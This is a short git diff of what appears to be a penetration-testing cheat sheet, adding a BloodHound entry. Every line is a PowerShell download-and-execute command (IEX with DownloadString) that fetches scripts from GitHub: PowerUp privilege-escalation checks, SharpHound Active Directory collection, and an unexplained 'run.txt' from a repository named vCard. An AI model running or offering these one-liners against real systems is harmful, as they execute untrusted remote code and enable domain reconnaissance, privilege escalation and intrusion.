@@ -11,8 +11,9 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20an
 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks
 
 
-
-
+Bloodhound
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/puckiestyle/powershell/master/SharpHound.ps1'); 
+Invoke-BloodHound -CollectionMethod All
 
 
 IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/caioMichele/vCard/main/run.txt')
